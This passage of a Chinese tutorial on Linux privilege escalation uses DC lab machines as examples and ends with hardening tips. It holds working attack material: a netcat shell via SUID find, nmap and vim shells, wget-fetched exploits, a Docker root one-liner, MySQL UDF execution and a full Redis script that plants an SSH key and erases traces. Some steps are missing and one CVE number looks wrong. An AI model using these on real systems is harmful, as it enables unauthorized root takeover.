    for i in `locate -r "bin$"`; do find $i \( -perm -4000 -o -perm -2000 \) -type f 2>/dev/null; done    # Looks in 'common' places: /bin, /sbin, /usr/bin, /usr/sbin, /usr/local/bin, /usr/local/sbin and any other *bin, for SGID or SUID (Quicker search)
    # find starting at root (/), SGID or SUID, not Symbolic links, only 3 folders deep, list with more detail and hide any errors (e.g. permission denied)
    find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \; 2>/dev/null
### 查看可写/执行目录
    find / -writable -type d 2>/dev/null      # world-writeable folders
    find / -perm -222 -type d 2>/dev/null     # world-writeable folders
    find / -perm -o w -type d 2>/dev/null     # world-writeable folders
    find / -perm -o x -type d 2>/dev/null     # world-executable folders
    find / \( -perm -o w -perm -o x \) -type d 2>/dev/null   # world-writeable & executable folders
### 查看安装过的工具
    find / -name perl*
    find / -name python*
    find / -name gcc*
    ...
## 提权操作
### SUID 提权
> 什么是suid？suid全称是 **S** et owner **U** ser **ID** up on
> execution。这是Linux给可执行文件的一个属性。通俗的理解为其他用户执行这个程序的时候可以用该程序所有者/组的权限。需要注意的是，只有程序的所有者是0号或其他super
> user，同时拥有suid权限，才可以提权。
这里推荐 P师傅的 
常见的可用来提权的Linux 可执行文件有：
Nmap, Vim, find, bash, more, less, nano, cp
查看可以suid 提权的可执行文件
    find / -perm -u=s -type f 2>/dev/null
  * find
    ls -al /usr/bin/find
    -rwsr-xr-x 1 root root 162424 Jan  6  2012 /usr/bin/find
> 实用程序find用来在系统中查找文件。同时，它也有执行命令的能力。
> 因此，如果配置为使用SUID权限运行，则可以通过find执行的命令都将以root身份去运行。
比如：DC -1 靶机就是利用find 命令进行root 用户来执行命令
大部分Linux 系统都安装了nc。使用`find aaa - exec netcat -lvp 5555 -e /bin/sh \;`
即可成功反弹root shell
  * nmap
早期nmap 具有交互模式，version 2.02～5.21（5.2.0）。这里我用metasploitable2 来演示
`namp -V` 查看nmap 版本信息
`nmap --interactive`
我最喜欢的`Metasploit` 中就有利用 SUID nmap 提权的exp
`search nmap` 然后利用 `exploit/unix/local/setuid_nmap` 漏洞利用模块即可
5.2.0 之后，nmap 还可以通过执行脚本来提权。
    # nse 脚本，shell.nse
    os.execute('/bin/sh')
    # nmap 提权
    nmap --script=shell.nse 
    # 在某些发行版的Linux 可能会提权失败。具体原理移步p 师傅文章
或者
    echo 'os.execute("/bin/sh")' > getshell
    sudo nmap --script=getshell
参考DC 6 靶机：[https://hack-for.fun/posts/8886.html#%E6%8F%90%E6%9D%83](https://hack-for.fun/posts/8886.html#提权)
  * vim
如果vim 是通过SUID运行，就会继承root用户的权限。可读取只有root能读取的文件。
`vim /etc/shadow`
vim 运行shell
    vim
    :set shell=/bin/sh
    :shell
同理，满足条件的 less 和 more 都可。
### 利用内核漏洞
比如DC 3 靶机，就是利用系统内核漏洞来进行提权。
`searchsploit Ubuntu 16.04`
将exp 下载下来，解压，编译，运行，即可get root 权限。
`tar xvf exploit.tar`
还有大名鼎鼎的CVE-2016-5195，脏牛漏洞。（Linux kernel >=2.6.22 并且Android也受影响
  * 
  * 
  * 复现参考：
其他内核漏洞：
Linux Kernel 3.13.0 
Linux Kernel 4.3.3 (Ubuntu 14.04/15.10) – ‘overlayfs’ Local Root Exploit
Linux Kernel 4.3.3 – 'overlayfs' Local Privilege Escalation
> 提示：内核exploit提权有风险，有可能会崩溃系统。
### 利用root无密码执行
简单来说，就是一个脚本，比如py,sh等或者是一个命令。这个文件可以以root身份运行，若在无密码的情况下执行的话，我们可以通过修改脚本内容/或者直接执行这个命令，利用命令来进行一些操作，来进行提权。
比如常见的：
  * 写入一个root身份权限的用户进入/etc/passwd 文件中
这里以DC 4 为例子：
`teehee -a` 将输入的内容追加到另一个文件中
简单说下`/etc/passwd` 各个字段的含义：
    username:password:User ID:Group ID:comment:home directory:shell
成功获取到root 权限。类似的操作还有很多，核心思想不变。
### 利用环境变量提权
`PATH` 是Linux 和 Unix
操作系统中的环境变量，它指定存储可执行程序的所有bin和sbin目录。当用户在终端上执行任何命令时，它会通过PATH变量来响应用户执行的命令，并向shell发送请求以搜索可执行文件。超级用户通常还具有/sbin和/usr/sbin条目，以便于系统管理命令的执行。
使用echo命令显示当前PATH环境变量：
如果你在PATH变量中看到`.`，则意味着登录用户可以从当前目录执行二进制文件/脚本
我们先编译一个可执行文件shell。
    #include
    void main()
    {
      setuid(0);
      setgid(0);
      system("cat /etc/passwd");
    }
    // aaa.c
在给该文件赋予权限。
然后查看它的权限可以发现是有`s` 位，即suid。
现在我们在目标机器上用`find / -perm -u=s -type f 2>/dev/null`
来查看可以suid提权的文件，发现之前编译的shell可执行文件在里面。
更多的操作可以参考：
### 利用存在漏洞的命令
不可否认的是命令很多，我们不可能熟悉每一种命令的漏洞。不过我们每次遇到了都可以用`searchsploit` 来寻找可利用的exp。
这里以DC 5 靶机为例：
`ls -al` ：
可以通过cat 读取一下这个文件怎么用。
攻击机器开启一个http 服务：
    python -m SimpleHTTPServer
将exploit 用 wget 下载到可执行的`/tmp/`目录下。然后执行`sh` 文件。最后在`/etc/`目录下执行`./rootshell`
即可get root shell。
* * *
还有之前爆的sudo 提权，CVE-2019-14187。只不过比较鸡肋。
> **Sudo 的全称是“superuserdo”，它是Linux系统管理指令，允许用户在不需要切换环境的前提下以其它用户的权限运行应用程序或命令。通常以
> root 用户身份运行命令，是为了减少 root 用户的登录和管理时间，同时提高安全性。**
**利用前提**
  1. sudo -v 
### 利用第三方服务提权
#### Docker 组提权
参考文章：
> docker 组内用户执行命令的时候会自动在所有命令前添加 sudo。因为设计或者其他的原因，Docker 给予所有 docker
> 组的用户相当大的权力（虽然权力只体现在能访问 /var/run/docker.sock 上面）。默认情况下，Docker 软件包是会默认添加一个
> docker 用户组的。Docker 守护进程会允许 root 用户和 docker  
>  组用户访问 Docker。给用户提供 Docker 权限和给用户无需认证便可以随便获取的 root 权限差别不大。
普通用户执行：即可获得root权限。
    docker run -v /:/hostOS -i -t chrisfosterelli/rootplease
#### MySQL UDF 提权
之前在做JarivsOJ CTF 里有一个题，里面就用了UDF，那是我第一次遇到这个东西。
    show variables like '%compile%';
    show variables like 'plugin%';
不过这里有一个限制，`show global variables like 'secure%'` secure_file_priv
没有具体的值（即能够导出/写入文件
> 当 secure_file_priv 的值为 NULL ，表示限制 mysqld 不允许导入|导出，此时无法提权  
>  当 secure_file_priv 的值为 /tmp/ ，表示限制 mysqld 的导入|导出只能发生在 /tmp/ 目录下，此时也无法提权  
>  当 secure_file_priv 的值没有具体值时，表示不对 mysqld 的导入|导出做限制，此时可提权
MSF 中的 `exploit/multi/mysql/mysql_udf_payload` 漏洞利用模块可以进行UDF提权
使用 `select sys_exec('whoami');` 或 `select sys_eval('whoami');` 来执行系统命令
#### Redis 批量getshell
> 如果Redis以root身份运行，黑客可以利用Redis写入SSH公钥文件，直接通过SSH免密码登录受害服务器。Redis
> 默认绑定在6379端口，并且没有开启认证，在没有任何访问策略的情况下，任何人可以直接在非授权情况下直接访问Redis服务并进行相关操作。
相关利用exp：
    #!/usr/bin/env python
    # -*- coding: utf-8 -*-    # project = https://github.com/Xyntax/POC-T
    # author = PI:EMAIL
    """
    redis getshell expliot (ssh authorized_keys)
    """
    import redis
    import paramiko
    from plugin.util import host2IP
    from plugin.util import randomString
    from plugin.util import checkPortTcp
    from paramiko.ssh_exception import SSHException
    public_key = 'ssh-rsa ====='
    private_key = """
    -----BEGIN RSA PRIVATE KEY-----    =====
    -----END RSA PRIVATE KEY-----    """
    import time
    def poc(url):
        url = host2IP(url)
        ip = url.split(':')[0]
        port = int(url.split(':')[-1]) if ':' in url else 6379
        try:
            if not checkPortTcp(ip, 22):
                return False
            r = redis.Redis(host=ip, port=port, db=0)
            if 'redis_version' in r.info():
                key = randomString(10)
                r.set(key, '\n\n' + public_key + '\n\n')
                r.config_set('dir', '/root/.ssh')
                r.config_set('dbfilename', 'authorized_keys')
                r.save()
                r.delete(key)  # 清除痕迹
                r.config_set('dir', '/tmp')
                time.sleep(5)
                if testConnect(ip, 22):
                    return True
        except Exception:
            return False
        return False
    def testConnect(ip, port=22):
        try:
            s = paramiko.SSHClient()
            s.load_system_host_keys()
            s.connect(ip, port, username='root', pkey=private_key, timeout=10)
            s.close()
            return True
        except Exception, e:
            if type(e) == SSHException:
                return True
            return False
其他……
> 一般情况情况下，内核漏洞或者第三方服务来提权的情况更多。
# 如何防止被提权
  * 系统管理员要安全，准确的配置SUID执行文件。
  * 一些没必要以高权限用户执行的文件，应该取消权限。
  * 规避使用无密码root 执行命令，脚本等。
  * 修复/升级存在已知漏洞的组件，升级操作系统版本最新版。
  * Linux 2.2 之后可以为命令增加 capabilities, 以p 师傅博客里的给nmap增加该属性为例。
  * 升级第三方服务，修复已知漏洞
    sudo setcap cap_net_raw,cap_net_admin,cap_net_bind_service+eip /usr/bin/nmap
    nmap --privileged -sS 192.168.1.1
# 总结
通过本次学习，脑海里有了一个大概的思路，以后遇到了也不会迷惘。但是我旁边师傅给我说，靶机的提权有些在实际中根本用不到。所以，还是要灵活处理，核心思路应该是不变的吧！
# 相关资料
  * 
  * 
  * 
  * 
  * 
  * 
  * 
  * 
  * 
  * 
  * 
  * 